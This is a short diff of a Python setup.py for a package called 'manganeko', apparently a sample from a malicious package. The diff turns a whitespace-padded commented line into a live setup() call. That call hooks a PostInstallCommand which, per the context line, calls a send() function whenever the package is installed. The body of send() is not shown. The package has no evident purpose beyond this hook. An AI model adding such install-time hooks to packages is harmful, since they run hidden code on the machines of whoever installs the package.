@@ -23,4 +23,12 @@ class PostInstallCommand(install):
         send()
 
 
-# setup(...) removed                                                                                                                                                                                             
+setup(
+  name='manganeko',
+  version='4.4.7',
+  description='A very basic firstbasicpyapp',
+  python_requires=">=3.6",
+  install_requires=[''],
+  tests_require=[],
+  cmdclass={'install': PostInstallCommand},
+)
